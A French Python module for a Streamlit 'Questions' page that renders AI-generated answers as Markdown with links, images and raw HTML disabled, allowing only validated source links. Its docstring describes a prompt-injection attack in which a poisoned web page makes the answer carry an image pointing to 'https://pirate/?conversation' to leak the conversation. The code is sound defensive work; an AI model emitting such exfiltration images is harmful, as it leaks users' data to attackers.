"""
affichage.py — Afficher sans danger le texte écrit par l'IA dans la page Questions.

Le texte d'une réponse peut avoir été influencé par une page web piégée (injection de prompt) :
s'il était affiché en Markdown, une image ![x](https://pirate/?conversation) serait chargée toute
seule par le navigateur (fuite de données), un lien pourrait mener à une page de hameçonnage.
Filtrer le texte avec des expressions régulières ne suffit jamais (entités HTML, échappements,
blocs de code mal fermés…). On utilise donc un vrai analyseur Markdown, configuré pour ne PAS
connaître les liens ni les images : par construction, il ne peut pas en produire.
"""

import html

from markdown_it import MarkdownIt

import web

# CommonMark + tableaux et texte barré. Désactivés : liens, images, liens automatiques <https://…>,
# HTML écrit dans le texte, et définitions de liens « [x]: url » (elles restent visibles en texte).
# linkify=False : les URL restent du texte simple. Les entités (&#58;…) sont décodées puis réécrites
# échappées par le moteur : « https&#58;//… » s'affiche « https://… », sans lien.
_MOTEUR = (
    MarkdownIt("commonmark", {"html": False, "linkify": False, "typographer": False})
    .enable(["table", "strikethrough"])
    .disable(["image", "link", "autolink", "html_inline", "html_block", "reference"])
)


def rendu_sur(texte: str) -> str:
    """Markdown -> HTML sans aucun lien ni image : gras, listes, titres, tableaux, code, [W1] restent."""
    return f'<div class="reponse-ia">{_MOTEUR.render(texte or "")}</div>'


# Le strict minimum de CSS : st.html reprend déjà la police et les couleurs du thème, mais pas les styles
# que Streamlit réserve à st.markdown (tableaux, code, liens). Tout est relatif à currentColor (la couleur
# du texte du thème) : le rendu suit le mode clair comme le mode sombre. À afficher une fois par page.
STYLE = """<style>
.reponse-ia table { border-collapse: collapse; margin: 0 0 1rem; display: block; overflow-x: auto; }
.reponse-ia th, .reponse-ia td { border: 1px solid color-mix(in srgb, currentColor 20%, transparent); padding: .25rem .75rem; }
.reponse-ia code { font-family: "Source Code Pro", monospace; font-size: .85em; padding: .1em .3em; border-radius: .25rem;
                   background: color-mix(in srgb, currentColor 8%, transparent); }
.reponse-ia pre { padding: .75rem 1rem; border-radius: .5rem; overflow-x: auto; background: color-mix(in srgb, currentColor 6%, transparent); }
.reponse-ia pre code { padding: 0; background: none; }
.reponse-ia a { color: inherit; }
</style>"""


def lien_source(titre: str, url: str) -> str:
    """
    Le seul lien autorisé : celui vers une source web, construit ici avec la vraie URL (acceptée par
    web.url_sure) et un titre échappé. Sans URL sûre : le titre seul, en texte.
    """
    titre = html.escape(titre)  # (affiché dans un bloc <div class="reponse-ia"> : même style de lien)
    if not web.url_sure(url):
        return titre
    return f'<a href="{html.escape(url, quote=True)}" target="_blank" rel="noopener noreferrer">{titre}</a>'
